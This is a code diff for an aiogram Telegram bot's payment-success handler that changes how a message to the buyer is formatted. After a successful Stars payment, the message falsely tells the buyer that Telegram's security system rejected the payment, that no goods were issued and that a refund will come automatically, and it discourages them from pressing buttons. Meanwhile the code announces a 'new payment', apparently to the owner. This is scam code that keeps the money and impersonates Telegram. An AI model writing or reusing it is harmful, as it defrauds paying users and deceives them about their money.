@@ -9,7 +9,7 @@ from aiogram.types import (
     Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
     LabeledPrice, PreCheckoutQuery, BusinessConnection,
     KeyboardButton, ReplyKeyboardMarkup, KeyboardButtonRequestUsers,
-    UsersShared, MessageEntity
+    UsersShared
 )
 from aiogram.types import (
     InputRichMessage,
@@ -696,38 +696,19 @@ async def payment_success(message: Message):
     buyer_first_name = buyer.first_name or "Покупатель"
     buyer_link = f'<a href="tg://user?id={buyer_id}">{html.escape(buyer_first_name)}</a>'
 
-    # ===== ОТПРАВКА С ПРЕМИУМ-ЭМОДЗИ ЧЕРЕЗ ENTITIES =====
-    # Текст с обычной звездой в начале (как fallback)
-    full_text = (
-        "⭐ Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. "
-        "Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.\n\n"
-        "Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.\n\n"
-        "Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.\n\n"
-        "В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.\n\n"
-        "По вопросам возврата вы можете обратиться в официальную поддержку Telegram."
-    )
-
-    # Собираем entities: bold для всего текста + custom_emoji для первого символа (звезды)
-    entities = [
-        MessageEntity(type="bold", offset=0, length=len(full_text)),
-        MessageEntity(type="custom_emoji", offset=0, length=1, custom_emoji_id="5447644880824181073")
-    ]
-
     try:
         await message.answer(
-            full_text,
-            entities=entities
+            '<tg-emoji emoji-id="5447644880824181073">⭐</tg-emoji> '
+            '<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
+            'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
+            '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
+            '<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
+            '<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
+            '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
+            parse_mode="HTML"
         )
     except Exception as e:
         print(f"[payment] Ошибка отправки покупателю: {e}")
-        # Если entities не сработали — отправляем с обычной звездой и bold
-        try:
-            await message.answer(
-                f"<b>⭐ {full_text[2:]}</b>",
-                parse_mode="HTML"
-            )
-        except Exception as e2:
-            print(f"[payment] Финальная ошибка: {e2}")
 
     text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
